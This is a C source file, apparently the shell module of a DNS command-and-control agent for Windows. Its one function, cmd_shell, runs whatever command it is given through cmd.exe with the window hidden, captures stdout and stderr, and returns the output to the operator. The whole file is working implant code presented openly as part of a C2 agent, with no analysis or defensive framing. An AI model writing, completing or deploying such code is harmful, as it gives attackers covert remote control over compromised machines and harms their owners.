/**
 * shell.c - Shell command execution for DNS C2 Agent
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "../include/shell.h"
 
 // Maximum output size
 #define MAX_OUTPUT_SIZE 8192
 
 /**
  * Execute a shell command
  */
 char* cmd_shell(const char* args) {
     if (args == NULL || *args == '\0') {
         return _strdup("Error: No command specified");
     }
     
     // Create pipes for stdout and stderr
     HANDLE hStdoutRead, hStdoutWrite;
     HANDLE hStderrRead, hStderrWrite;
     SECURITY_ATTRIBUTES sa;
     
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = NULL;
     
     if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0) ||
         !CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0)) {
         return _strdup("Error: Failed to create pipes");
     }
     
     // Set the handles to not be inherited
     SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
     SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);
     
     // Create the process
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     
     ZeroMemory(&si, sizeof(STARTUPINFOA));
     ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
     
     si.cb = sizeof(STARTUPINFOA);
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = NULL;
     si.hStdOutput = hStdoutWrite;
     si.hStdError = hStderrWrite;
     
     // Construct the command line
     char cmdline[4096];
     sprintf_s(cmdline, sizeof(cmdline), "cmd.exe /c %s", args);
     
     // Create the process
     if (!CreateProcessA(
         NULL,           // No module name (use command line)
         cmdline,        // Command line
         NULL,           // Process handle not inheritable
         NULL,           // Thread handle not inheritable
         TRUE,           // Inherit handles
         CREATE_NO_WINDOW, // Creation flags
         NULL,           // Use parent's environment block
         NULL,           // Use parent's starting directory
         &si,            // Pointer to STARTUPINFO structure
         &pi             // Pointer to PROCESS_INFORMATION structure
     )) {
         CloseHandle(hStdoutRead);
         CloseHandle(hStdoutWrite);
         CloseHandle(hStderrRead);
         CloseHandle(hStderrWrite);
         
         char* error = (char*)malloc(256);
         if (error != NULL) {
             sprintf_s(error, 256, "Error: Failed to create process (error code: %lu)", GetLastError());
         }
         return error;
     }
     
     // Close the write handles
     CloseHandle(hStdoutWrite);
     CloseHandle(hStderrWrite);
     
     // Read the output
     char* output = (char*)malloc(MAX_OUTPUT_SIZE);
     if (output == NULL) {
         CloseHandle(hStdoutRead);
         CloseHandle(hStderrRead);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return _strdup("Error: Failed to allocate memory for output");
     }
     
     output[0] = '\0';
     DWORD bytesRead;
     DWORD totalBytesRead = 0;
     char buffer[4096];
     
     // Read stdout
     while (ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
         buffer[bytesRead] = '\0';
         
         // Check if we have enough space
         if (totalBytesRead + bytesRead >= MAX_OUTPUT_SIZE - 1) {
             // Not enough space, truncate
             strncat_s(output, MAX_OUTPUT_SIZE, buffer, MAX_OUTPUT_SIZE - totalBytesRead - 1);
             strcat_s(output, MAX_OUTPUT_SIZE, "\n[Output truncated]");
             break;
         }
         
         // Append to output
         strcat_s(output, MAX_OUTPUT_SIZE, buffer);
         totalBytesRead += bytesRead;
     }
     
     // Read stderr
     while (ReadFile(hStderrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
         buffer[bytesRead] = '\0';
         
         // Check if we have enough space
         if (totalBytesRead + bytesRead >= MAX_OUTPUT_SIZE - 1) {
             // Not enough space, truncate
             strncat_s(output, MAX_OUTPUT_SIZE, buffer, MAX_OUTPUT_SIZE - totalBytesRead - 1);
             strcat_s(output, MAX_OUTPUT_SIZE, "\n[Output truncated]");
             break;
         }
         
         // Append to output
         strcat_s(output, MAX_OUTPUT_SIZE, buffer);
         totalBytesRead += bytesRead;
     }
     
     // Close handles
     CloseHandle(hStdoutRead);
     CloseHandle(hStderrRead);
     
     // Wait for the process to exit
     WaitForSingleObject(pi.hProcess, INFINITE);
     
     // Get the exit code
     DWORD exitCode;
     GetExitCodeProcess(pi.hProcess, &exitCode);
     
     // Close process handles
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     
     // If no output, return a message
     if (totalBytesRead == 0) {
         free(output);
         char* result = (char*)malloc(64);
         if (result != NULL) {
             sprintf_s(result, 64, "Command executed (exit code: %lu)", exitCode);
         }
         return result;
     }
     
     return output;
 }
 